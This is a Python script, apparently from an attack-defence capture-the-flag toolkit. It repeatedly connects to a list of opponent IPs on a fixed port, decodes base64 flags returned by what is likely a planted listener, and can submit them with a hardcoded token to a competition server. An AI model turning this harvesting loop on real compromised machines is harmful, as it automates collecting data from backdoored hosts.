import multiprocessing
import logging
import socket
import time
import base64
import requests
import traceback

commit_url=r'http://172.16.100.5:9000/submit_flag/' #url for commit flag
show_only_changed=False
filename=r'D:\AttackScripts\AD_scripts\getFlag\targets.txt'
port=55168  #port to connect
interval=15

mode='development'
if mode=='development':
    log_format='%(asctime)s %(filename)s[line:%(lineno)d] %(levelname)s %(message)s'
    l=logging.DEBUG
elif mode=='product':
    log_format='%(asctime)s %(message)s'
    l=logging.INFO

class CommitData:
    def __init__(this,ip,flag,token=''):
        this.ip=ip.strip()
        this.flag=flag.strip()
        this.token=token.strip() if token!='' else r'oDdcfREB94tu89X0txJWtQGK6uLm9rPC5n5kzLSJQfG3XnvJ367CJS2pWP6i0fo6b1FuajAPxMU'   #update token for each competition
    def getIP(this):
        return this.ip
    def getFlag(this):
        return this.flag
    def toString(this):
        return "[%s]=%s"%(this.ip,this.flag)
    def getCommitData(this):
        return {'flag':this.flag,'token':this.token}

logging.basicConfig(level=l,format=log_format,datefmt='%a, %d %b %Y %H:%M:%S',filename='server.log',filemode='w')
console=logging.StreamHandler()
console.setLevel(l)
formatter = logging.Formatter(log_format)
console.setFormatter(formatter)
logging.getLogger('').addHandler(console)

def commitFlag(data):
    global commit_url
    r=requests.post(commit_url,data=data.getCommitData())
    # r.close()
    logging.info("%s commit status:%s"%(data.toString(),r.status_code))

def w(ip):
    global interval,port
    last_flag=None
    logging.debug(ip+' process Starting...')
    data=None
    s=None
    while True:
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.settimeout(3)
            logging.debug('connectting %s:%s'%(ip,port))
            s.connect((ip,port))
            data=base64.b64decode(s.recv(2048).strip())
            data=CommitData(ip,data)
            logging.debug('Recieved %s'%(data.toString()))
        except:
            logging.debug(traceback.format_exc())
            data=None
        finally:
            if data:
                if not show_only_changed or  last_flag!=data.getFlag():
                    last_flag=data.getFlag()
                    logging.info('Recieved %s'%(data.toString()))
                    #commitFlag(data)
            try:
                # s.shutdown(socket.SHUT_RDWR) #TODO:how to close socket connection efficiently
                s.close() #
            except:
                logging.debug(traceback.format_exc())
            time.sleep(interval)

if __name__=='__main__':
    logging.info('Starting server...')
    targets=[]
    for line in open(filename).readlines():
        targets.append(line.strip())
    logging.debug('Found targets:'+str(len(targets)))
    pool=multiprocessing.Pool(2)
    for target in targets:
        pool.apply_async(w,(target,))
    pool.close()
    pool.join()
    logging.info('Endding...')
